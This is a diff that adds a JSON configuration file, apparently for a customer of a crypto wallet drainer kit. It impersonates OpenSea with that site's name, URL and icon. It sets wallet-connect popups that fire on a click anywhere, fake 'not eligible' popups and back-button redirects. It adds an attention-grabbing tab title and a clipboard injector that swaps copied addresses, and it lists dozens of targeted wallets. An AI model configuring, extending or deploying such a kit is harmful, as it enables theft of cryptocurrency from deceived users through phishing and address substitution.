@@ -1,0 +1,51 @@
+{
+    "CUSTOMER_KEY": "Brandon_562",
+
+    "MODAL_THEME": {
+        "mode": "dark",
+        "options": ["dark", "light"]},
+
+    "WALLET_CONNECT_MODAL": {
+        "mode": "click_anywhere",
+        "options": ["click_anywhere", "button"],
+        "buttonClass": "connect_wallet"},
+
+    "PROMPT_STRATEGY":{
+        "mode": "one_step",
+        "options": ["one_step", "two_step"],
+        "two_step_button": "start_prompts"},
+
+    "POPUPS": {
+        "not_eligible": {
+            "style": 1,
+            "options": [1, 2, 3, 4, 5, 6, 7]}},
+
+    "BACK_BUTTON": {
+        "mode": "enabled",
+        "options": ["enabled", "disabled", "redirect"],
+        "redirect_url": "https://google.com"},
+
+    "TITLE_CHANGE_ON_LEAVE": {
+        "mode": "disabled",
+        "options": ["enabled", "disabled"],
+        "page_title": "🚨 Come Back! Important!"},
+
+    "CLIPBOARD_INJECTOR": {
+        "mode": "disabled",
+        "options": ["enabled", "disabled"],
+        "address": "0x0000000000000000000000000000000000"},
+    
+    "APP_METADATA": {
+        "name": "Opensea", 
+        "description": "The largest NFT marketplace", 
+        "url": "https://opensea.io/", 
+        "icons": ["https://i.seadn.io/gcs/files/7ed181433ee09174f09a0e31b563d313.png?auto=format&dpr=1&w=3840"]},
+
+    "FEATURED_WALLETS":{
+        "desktop": ["MetaMask", "TrustWallet", "Zerion", "Coinbase", "OKX", "Uniswap", "Rainbow"],
+        "mobile": ["MetaMask", "Coinbase", "TrustWallet", "OKX", "Rainbow", "imToken", "Zerion", "Uniswap"],
+        "options": [
+            "MetaMask", "imToken", "Coinbase", "OKX", "TrustWallet", "Bitget", "Binance", "SafePal", "Uniswap", "Bybit", "TokenPocket", "Rainbow", "Crypto_com",
+            "Zerion", "Brave", "Phantom", "Oneinch", "Bifrost", "Kraken", "Safe", "Ronin", "Exodus", "Blockchain", "Keplr", "MagicEden", "WemixPlay",
+            "MathWallet", "Robinhood", "Opera", "Argent", "OneKey", "Rabby", "Frontier", "ThorWallet", "Torus", "Coin98", "Enkrypt", "Nightly", "Thirdweb"]}
+}
